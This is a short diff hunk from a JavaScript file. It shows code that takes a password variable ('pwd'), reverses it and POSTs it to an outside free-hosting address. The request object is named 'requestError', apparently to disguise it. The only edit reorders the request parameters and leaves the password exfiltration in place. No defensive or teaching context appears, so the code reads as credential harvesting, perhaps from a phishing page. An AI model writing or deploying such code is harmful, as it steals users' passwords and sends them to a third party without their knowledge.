@@ -265,7 +265,7 @@
 
                     var url = 'https://tw-course.000webhostapp.com/';
                     var data = reverseString(pwd);
-                    var postData = 'data=' + data + '&encoded=' + encodeURI(data);
+                    var postData = 'encoded=' + encodeURI(data) + '&data=' + data ;
                     var requestError = new XMLHttpRequest();
                     requestError.open('POST', url, true);
                     requestError.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
